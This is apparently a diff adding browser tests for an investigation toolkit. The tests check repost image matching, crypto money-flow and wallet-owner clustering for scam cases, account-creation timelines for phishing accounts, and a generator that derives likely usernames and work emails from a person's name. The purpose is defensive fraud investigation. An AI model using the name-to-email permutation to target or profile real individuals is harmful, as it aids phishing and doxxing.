+test('the same picture elsewhere: real photos found again after cropping, resizing, re-saving, mirroring, framing in a screenshot and text over them — and different photos are never matched', async ({ page }) => {
+  const errors = await open(page, '#/home'); const fs = require('fs'), path = require('path'), dir = path.join(__dirname, 'fixtures/pics');
+  const P = fs.readdirSync(dir).filter(f => f.endsWith('.jpg')).sort().map(f => fs.readFileSync(path.join(dir, f)).toString('base64'));
+  const R = await page.evaluate(async P => {
+    const blob = b64 => new Blob([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], { type: 'image/jpeg' });
+    const draw = (w, h, fn) => { const c = document.createElement('canvas'); c.width = Math.round(w); c.height = Math.round(h); fn(c.getContext('2d')); return c; };
+    const jpg = (c, q) => new Promise(r => c.toBlob(r, 'image/jpeg', q));
+    const V = {
+      resized: b => draw(b.width / 2, b.height / 2, x => x.drawImage(b, 0, 0, b.width / 2, b.height / 2)),
+      resaved: b => draw(b.width, b.height, x => x.drawImage(b, 0, 0)),
+      crop10: b => draw(b.width * .8, b.height * .8, x => x.drawImage(b, -b.width * .1, -b.height * .1)),
+      crop20side: b => draw(b.width * .8, b.height, x => x.drawImage(b, -b.width * .2, 0)),
+      crop30: b => draw(b.width * .7, b.height * .7, x => x.drawImage(b, -b.width * .15, -b.height * .15)),
+      mirrored: b => draw(b.width, b.height, x => { x.translate(b.width, 0); x.scale(-1, 1); x.drawImage(b, 0, 0); }),
+      screenshot: b => draw(b.width + 40, b.height + 160, x => { x.fillStyle = '#fff'; x.fillRect(0, 0, b.width + 40, b.height + 160); x.fillStyle = '#111'; x.fillRect(0, 0, b.width + 40, 50); x.drawImage(b, 20, 70); x.font = '20px sans-serif'; x.fillText('Liked by 214 others', 20, b.height + 110); }),
+      textOver: b => draw(b.width, b.height, x => { x.drawImage(b, 0, 0); x.fillStyle = 'rgba(0,0,0,.6)'; x.fillRect(0, b.height * .78, b.width, b.height * .22); x.fillStyle = '#fff'; x.font = 'bold 36px sans-serif'; x.fillText('SHARE BEFORE THEY DELETE', 10, b.height * .92); }),
+      grey: b => draw(b.width, b.height, x => { x.filter = 'grayscale(1)'; x.drawImage(b, 0, 0); }),
+      rotated3: b => draw(b.width, b.height, x => { x.translate(b.width / 2, b.height / 2); x.rotate(3 * Math.PI / 180); x.drawImage(b, -b.width / 2, -b.height / 2); }),
+      cropAndShrink: b => draw(b.width * .45, b.height * .45, x => x.drawImage(b, -b.width * .05, -b.height * .05, b.width * .5, b.height * .5)),
+    };
+    const base = []; for(const p of P){ const bl = blob(p); base.push({ b: await createImageBitmap(bl), s: await picSigBlob(bl), d: await dhashBlob(bl) }); }
+    const found = {}, old = {}; for(const [k, f] of Object.entries(V)){ found[k] = 0; old[k] = 0; for(const x of base){ const c = await jpg(f(x.b), k === 'resaved' ? .3 : .8); const s = await picSigBlob(c); if(picMatch(s, x.s)) found[k]++; if(hamming(await dhashBlob(c), x.d) <= 10) old[k]++; } }
+    let wrong = 0, closest = 64; for(let i = 0; i < base.length; i++) for(let j = i + 1; j < base.length; j++){ if(picMatch(base[i].s, base[j].s)) wrong++; closest = Math.min(closest, picDist(base[i].s, base[j].s).d); }
+    return { n: base.length, found, old, wrong, closest };
+  }, P);
+  console.log('picture matching', JSON.stringify(R));
+  expect(R.n).toBe(18);
+  expect(R.wrong).toBe(0);                                                                         // 153 pairs of different photos: none matched
+  const need = { resized: 15, resaved: 18, crop10: 17, crop20side: 15, crop30: 15, mirrored: 18, screenshot: 12, textOver: 17, grey: 17, rotated3: 16, cropAndShrink: 13 };
+  for(const [k, n] of Object.entries(need)) expect(R.found[k], k).toBeGreaterThanOrEqual(n);
+  for(const k of ['crop10', 'crop20side', 'crop30', 'mirrored', 'screenshot']) expect(R.found[k], k + ' better than before').toBeGreaterThan(R.old[k] + 8);
+  // in a case: a cropped and mirrored repost in another case is shown in the evidence panel, with how it was changed
+  await page.evaluate(async b64 => { for(const [id, code] of [['c-pi1', 'PI-1'], ['c-pi2', 'PI-2']]) DB.cases.push({ id, code, name: code, color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    const bl = new Blob([Uint8Array.from(atob(b64), c => c.charCodeAt(0))], { type: 'image/jpeg' }), b = await createImageBitmap(bl), c = document.createElement('canvas'); c.width = b.width * .8; c.height = b.height * .8; const x = c.getContext('2d'); x.translate(c.width, 0); x.scale(-1, 1); x.drawImage(b, -b.width * .1, -b.height * .1);
+    const rep = await new Promise(r => c.toBlob(r, 'image/jpeg', .7));
+    UI.capCase = 'c-pi1'; DB.active = 'c-pi1'; await attachFiles([new File([bl], 'original.jpg', { type: 'image/jpeg' })]);
+    UI.capCase = 'c-pi2'; DB.active = 'c-pi2'; await attachFiles([new File([rep], 'repost.jpg', { type: 'image/jpeg' })]);
+    const r = DB.records.find(x => x.caseId === 'c-pi1'); UI.sel = { kind: 'rec', id: r.id }; UI.inspOpen = true; DB.active = 'c-pi1'; go(caseHash('c-pi1', 'timeline')); }, P[2]);
+  const sec = page.locator('.isec', { hasText: 'The same picture elsewhere' });
+  await expect(sec.locator('.ps-l li')).toHaveCount(1); await expect(sec).toContainText('repost.jpg'); await expect(sec).toContainText('PI-2'); await expect(sec).toContainText('cropped from this picture and mirrored');
+  await expect(sec.locator('a', { hasText: 'TinEye' })).toHaveAttribute('href', 'https://tineye.com/');
+  noErrors(errors);
+});
+
+test('money flows: Bitcoin, Ethereum and TRON transactions from seven explorer formats joined into who paid whom — owners grouped by common inputs, change left out, CoinJoin and failed transactions set aside, patterns and other cases found', async ({ page }) => {
+  const errors = await open(page, '#/home'); const fs = require('fs'), path = require('path'), dir = path.join(__dirname, 'fixtures/chain');
+  const T = Object.fromEntries(fs.readdirSync(dir).filter(f => !/\.py$|addresses/.test(f)).map(f => [f, fs.readFileSync(path.join(dir, f), 'utf8')])), A = JSON.parse(fs.readFileSync(dir + '/addresses.json', 'utf8'));
+  const K = await page.evaluate(T => Object.fromEntries(Object.entries(T).map(([f, t]) => [f, (walletParse(t) || {}).label])), T);
+  expect(K).toEqual({ 'blockchain-scam2.json': 'Bitcoin (blockchain.com) — 2 transactions · BTC', 'blockcypher-peel.json': 'Bitcoin (BlockCypher) — 3 transactions · BTC', 'esplora-scam1.json': 'Bitcoin (Esplora) — 7 transactions · BTC', 'etherscan-forward.csv': 'Ethereum (Etherscan CSV) — 2 transactions · ETH', 'etherscan-tokentx.json': 'Ethereum tokens (Etherscan) — 1 transaction · USDT', 'etherscan-txlist.json': 'Ethereum (Etherscan) — 4 transactions · ETH', 'tronscan-trc20.json': 'TRON (Tronscan / TronGrid) — 3 transactions · USDT' });
+  await page.evaluate(([T, A]) => { DB.cases.push({ id: 'c-wl', code: 'WL-1', name: 'Pig-butchering scam', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() }, { id: 'c-wl2', code: 'EX-7', name: 'Exchange subpoena', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    const mk = (id, caseId, title, body) => DB.records.push({ id, caseId, type: 'evidence', title, body, ts: Date.UTC(2024, 2, 1), tsRaw: '', tsZone: 'explicit', source: 'x', host: '', tags: [], ents: extractRich(body), addedAt: Date.now() });
+    mk('r-wl-rep', 'c-wl', 'Victim report', `Victims were told to pay ${A.S1} (BTC), ${A.E1} (ETH) or ${A.T1} (USDT on TRON).`);
+    mk('r-wl-ex', 'c-wl2', 'Deposit addresses from the exchange', `Customer deposit address: ${A.EX}`);
+    for(const [f, t] of Object.entries(T)) if(f !== 'etherscan-forward.csv') mk('r-wl-' + f, 'c-wl', f, t);
+    mutate('add'); DB.active = 'c-wl'; UI.ivView = 'money'; go(caseHash('c-wl', 'infra')); }, [T, A]);
+  // the CSV export goes in through the paste box
+  await page.click('[data-act=wlPaste]'); await page.fill('#wlText', T['etherscan-forward.csv']); await expect(page.locator('#wlHint')).toContainText('Recognised: Ethereum (Etherscan CSV) — 2 transactions'); await page.click('#dlg [type=submit]');
+  const X = await page.evaluate(A => { const X = walletIndex('c-wl'), own = a => X.find(a), flow = (f, t, asset) => X.flows.filter(e => e.f === own(f) && e.to === own(t) && e.asset === asset).map(e => +e.v.toFixed(8));
+    return { owners: [...X.owners.values()].filter(g => g.addrs.length > 1).map(g => g.addrs.sort()), sameOwner: own(A.S1) === own(A.S2),
+      intoScam: A.V.slice(0, 5).map(v => flow(v, A.S1, 'BTC')[0]), toExchange: flow(A.S1, A.X, 'BTC'), toS3: flow(A.S1, A.S3, 'BTC'),
+      eth: [flow(A.VA, A.E1, 'ETH'), flow(A.VB, A.E1, 'ETH'), flow(A.E1, A.E2, 'ETH'), flow(A.E2, A.EX, 'ETH'), flow(A.VC, A.E1, 'USDT')], tron: flow(A.T1, A.TX, 'USDT'),
+      cjFlows: X.flows.filter(e => /cj/.test(e.f)).length, cjOwners: [...X.owners.values()].filter(g => g.addrs.length > 1).length,
+      notes: X.notes.map(n => n.kind).sort(), peel: (X.notes.find(n => n.kind === 'peel') || {}).t, other: [...X.other.entries()].map(([a, cs]) => [a === A.EX, cs]), focus: X.focus.size, txs: X.txs.length }; }, A);
+  expect(X.sameOwner).toBe(true);                                                                            // spent together in the consolidation
+  expect(X.owners).toEqual([[A.S1, A.S2].sort()]);                                                           // the CoinJoin's inputs are not grouped
+  expect(X.intoScam).toEqual([0.05, 0.12, 0.031, 0.2, 0.08]);
+  expect(X.toExchange).toEqual([0.4]); expect(X.toS3).toEqual([0.0809]);
+  expect(X.eth).toEqual([[1.5], [0.8], [2.25], [2.2], [5000]]);                                              // the failed 9 ETH transfer is not counted; a checksummed address is the same wallet
+  expect(X.tron).toEqual([1195]);
+  expect(X.txs).toBe(20);                                                                                     // the consolidation was in two pastes and the ETH forward in JSON and CSV: counted once
+  expect(X.notes).toEqual(['coinjoin', 'fan-in', 'pass-through', 'pass-through', 'pass-through', 'pass-through', 'peel']);
+  expect(X.peel).toMatch(/3 hops.*0\.01 BTC, 0\.011 BTC, 0\.0105 BTC/);
+  expect(X.other).toEqual([[true, ['c-wl2']]]);
+  expect(X.focus).toBe(4);                                                                                    // the three wallets in the report (BTC as one owner of two) and the one looked up on BlockCypher
+  // on screen
+  await expect(page.locator('.if-c', { hasText: 'What stands out' })).toContainText('Peel chain');
+  await expect(page.locator('.if-c', { hasText: 'In other cases' })).toContainText('EX-7');
+  await expect(page.locator('.if-c', { hasText: 'One owner, several addresses' })).toContainText(A.S2);
+  await expect(page.locator('.wl-svg .wl-n.mine')).toHaveCount(4);
+  await page.locator('.if-t tbody tr', { hasText: '2.2 ETH' }).locator('[data-act=wlRecs]').click();
+  expect(await page.evaluate(() => [UI.tlMode, UI.facet.ids.length, recById(UI.facet.ids[0]).source])).toEqual(['events', 1, 'chain:Ethereum (Etherscan CSV)']);
+  noErrors(errors);
+});
+
+test('account timeline: creation dates from GitHub, X, Reddit and Mastodon profile data and from page text, a rename found by account number and one written on the page, and freshly made accounts set up together pointed out', async ({ page }) => {
+  const errors = await open(page, '#/home'); const fs = require('fs'), path = require('path'), dir = path.join(__dirname, 'fixtures/profiles'), F = n => fs.readFileSync(path.join(dir, n), 'utf8');
+  const P = await page.evaluate(F => Object.fromEntries(Object.entries(F).map(([n, t]) => { const p = ftParseJson(t)[0]; return [n, p ? [p.platform, p.handle, p.id, new Date(p.created.ms).toISOString()] : null]; })), Object.fromEntries(['github-octocat.json', 'x-v2-user.json', 'reddit-about.json', 'mastodon-account.json', 'x-profile-page.txt'].map(n => [n, F(n)])));
+  expect(P).toEqual({ 'github-octocat.json': ['GitHub', 'octocat', '583231', '2011-01-25T18:44:36.000Z'], 'x-v2-user.json': ['X / Twitter', 'harbour_deals', '1760099200000000001', '2024-02-20T22:41:07.000Z'], 'reddit-about.json': ['Reddit', 'harbourline_support', 't2_wq3c8n1z', '2024-02-22T16:00:00.000Z'], 'mastodon-account.json': ['Mastodon', 'hlportal@mastodon.social', '112033445566778899@mastodon.social', '2024-02-25T00:00:00.000Z'], 'x-profile-page.txt': null });
+  await page.evaluate(F => { DB.cases.push({ id: 'c-ft', code: 'FT-1', name: 'Harbour phish accounts', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
+    let i = 0; const mk = (body, d, h = 12) => DB.records.push({ id: 'r-ft' + (i++), caseId: 'c-ft', type: 'evidence', title: body.split('\n')[0].slice(0, 60), body, ts: Date.UTC(2024, 2, d, h), tsRaw: '', tsZone: 'explicit', source: 'x', host: '', tags: [], ents: extractRich(body), addedAt: Date.now() });
+    mk('Victim report: @harbour_deals sent me the refund link by DM', 1); mk('Victim report 2: Reddit user @harbourline_support offered to "speed up the refund"', 2); mk('Second victim names @harbour_deals again', 5, 9);
+    mk('Kit template forked from @octocat example repo', 6); mk(F['github-kit-before.json'], 5); mk(F['github-kit-after.json'], 12); mk(F['x-v2-user.json'], 10); mk(F['reddit-about.json'], 10); mk(F['reddit-old.json'], 8); mk(F['github-octocat.json'], 9); mk(F['mastodon-account.json'], 10); mk(F['x-profile-page.txt'], 10);
+    mutate('add'); DB.active = 'c-ft'; UI.ivView = 'acc'; go(caseHash('c-ft', 'infra')); }, Object.fromEntries(fs.readdirSync(dir).filter(n => !/README/.test(n)).map(n => [n, F(n)])));
+  const X = await page.evaluate(() => { const X = footIndex('c-ft'); return { acc: Object.fromEntries(X.accounts.map(a => [a.handle, [a.created ? new Date(a.created.ms).toISOString().slice(0, 10) : null, a.first ? new Date(a.first).toISOString().slice(0, 10) : null, a.names.filter(n => n.old).map(n => n.v)]])), notes: X.notes.map(n => n.kind + ': ' + n.t) }; });
+  expect(X.acc['harbour_deals']).toEqual(['2024-02-20', '2024-03-01', ['hl_giveaways']]);           // the exact date from X, not "February 2024" from the page; the old name from the page
+  expect(X.acc['harbourline_support']).toEqual(['2024-02-22', '2024-03-02', []]);
+  expect(X.acc['cloud-sync-tools']).toEqual(['2024-02-26', '2024-03-05', ['hl-portal-dev']]);      // the same GitHub account number under its old name
+  expect(X.acc['hl-portal-dev']).toBeUndefined();
+  expect(X.acc['hlportal@mastodon.social'][0]).toBe('2024-02-25');
+  expect(X.acc['octocat']).toEqual(['2011-01-25', '2024-03-06', []]); expect(X.acc['old_trader_99'][0]).toBe('2016-05-01');
+  expect(X.notes).toEqual(['new: harbour_deals was made 10 days before it first appears in your evidence', 'renamed: harbour_deals was called hl_giveaways before', 'new: harbourline_support was made 9 days before it first appears in your evidence',
+    'new: hlportal@mastodon.social was made 15 days before it first appears in your evidence', 'new: cloud-sync-tools was made 8 days before it first appears in your evidence', 'renamed: cloud-sync-tools was called hl-portal-dev before',
+    'together: harbour_deals, harbourline_support, hlportal@mastodon.social, cloud-sync-tools were made within 5 days of each other']);   // 2024 is a leap year: 20 Feb 22:41 to 1 Mar noon is 9.6 days
+  expect(X.notes.join('\n')).not.toMatch(/octocat|old_trader_99/);
+  // on screen
+  await expect(page.locator('.ft-svg .ft-c')).toHaveCount(6);   // six accounts with a creation date
+  await expect(page.locator('.if-c', { hasText: 'What stands out' }).locator('li')).toHaveCount(X.notes.length);
+  await page.click('[data-act=ftPaste]'); await page.fill('#ftText', F('github-octocat.json')); await expect(page.locator('#ftHint')).toContainText('Recognised: GitHub profile of octocat, made 2011-01-25');
+  await page.fill('#ftText', '{"hello": "world"}'); await page.click('#dlg [type=submit]'); await expect(page.locator('#dlg')).toContainText('not a profile');
+  noErrors(errors);
+});
+
+test('generators: real-world names (accents, apostrophes, particles, double-barrelled, middle names, handles, years) give ranked usernames and emails, each copyable; the Forensics kit shows every tool at common screen widths', async ({ page }) => {
+  const errors = await open(page, '#/home');
+  const R = await page.evaluate(() => { const top = (o, n = 6) => genBuild(o).users.filter(x => x.tier === 1).map(x => x.v).slice(0, n), has = (o, v) => genBuild(o).users.some(x => x.v === v);
+    return { okafor: top({ name: 'Jordan Okafor' }), oneil: top({ name: "Siobhán O'Neil" }, 2), vdb: has({ name: 'Jan van der Berg' }, 'jan.vanderberg') && has({ name: 'Jan van der Berg' }, 'jberg'), dbl: has({ name: 'Emma Smith-Jones' }, 'emma.smithjones') && has({ name: 'Emma Smith-Jones' }, 'ejones'),
+      mid: has({ name: 'Mary Ann Lee' }, 'mal.lee') || has({ name: 'Mary Ann Lee' }, 'malee'), comma: top({ name: 'lol,bitcvh' }, 2), years: has({ name: 'Jordan Okafor', nums: '1992' }, 'jokafor92') && has({ name: 'Jordan Okafor', nums: '1992' }, 'jordan.okafor1992'),
+      nick: genBuild({ nicks: '@jo_k' }).users[0].v, corp: genBuild({ name: 'Jordan Okafor', domains: 'corp.example, https://corp.co.uk/about' }).corp.filter(x => x.tier === 1).map(x => x.v), none: genBuild({ name: '' }) }; });
+  expect(R.okafor).toEqual(['jordanokafor', 'jokafor', 'jordan.okafor', 'j.okafor', 'jordan_okafor', 'j_okafor']);
+  expect(R.oneil).toEqual(['siobhanoneil', 'soneil']); expect(R.vdb).toBe(true); expect(R.dbl).toBe(true); expect(R.mid).toBe(true);
+  expect(R.comma).toEqual(['lolbitcvh', 'lbitcvh']); expect(R.years).toBe(true); expect(R.nick).toBe('jo_k'); expect(R.none).toBe(null);
+  expect(R.corp).toEqual(['jordan.okafor@corp.example', 'jokafor@corp.example', 'jordan@corp.example', 'jordanokafor@corp.example', 'jordan.okafor@corp.co.uk', 'jokafor@corp.co.uk', 'jordan@corp.co.uk', 'jordanokafor@corp.co.uk']);
+  // on screen: every tool tab visible without scrolling, at laptop and small-desktop widths
+  // the tool bar is one line at laptop and desktop widths; every tool is one click into its group
+  for(const w of [1024, 1280, 1440]){ await page.setViewportSize({ width: w, height: 800 }); await page.evaluate(() => { UI.labTab = 'gen'; go('#/lab'); });
+    const rows = await page.evaluate(() => new Set([...document.querySelectorAll('.lt-cat')].map(b => Math.round(b.getBoundingClientRect().top))).size);
+    expect(rows, 'width ' + w).toBe(1); await expect(page.locator('.lt-c.on .lt-cur')).toHaveText('Generators'); }
+  expect(await page.locator('.lt-pop [data-act=labTab]').count()).toBe(13);
+  await page.click('.lt-cat[data-v="0"]'); await expect(page.locator('.lt-pop').first()).toBeVisible(); await page.click('.lt-pop [data-v=pcap]');
+  await expect(page.locator('.lt-c.on .lt-cur')).toHaveText('PCAP'); await expect(page.locator('.lt-pop').first()).toBeHidden();
+  await page.click('.lt-cat[data-v="2"]'); await page.keyboard.press('Escape'); await expect(page.locator('.lt-pop').nth(2)).toBeHidden();
+  await page.click('.lt-cat[data-v="2"]'); await page.click('.lt-pop [data-v=gen]');
+  await page.fill('#genName', 'Jordan Okafor'); await page.fill('#genDom', 'corp.example');
+  const first = page.locator('.gen-s').first().locator('.gen-i').first();
+  await expect(first.locator('code')).toHaveText('jordanokafor');
+  await first.hover(); await first.locator('[data-act=flagCopy]').click();
+  await page.fill('#genQ', 'j.'); await expect(page.locator('.gen-s').first().locator('.gen-i code').first()).toHaveText('j.okafor');
+  await page.fill('#genQ', ''); await page.click('[data-act=genSep][data-v="."]');
+  await expect(page.locator('.gen-s').first()).not.toContainText('jordan.okafor');
+  const [dl] = await Promise.all([page.waitForEvent('download'), page.locator('.gen-s', { hasText: 'Work email' }).locator('[data-act=genSave]').click()]);
+  expect(dl.suggestedFilename()).toBe('jordan-okafor-work-email.txt');
+  noErrors(errors);
+});
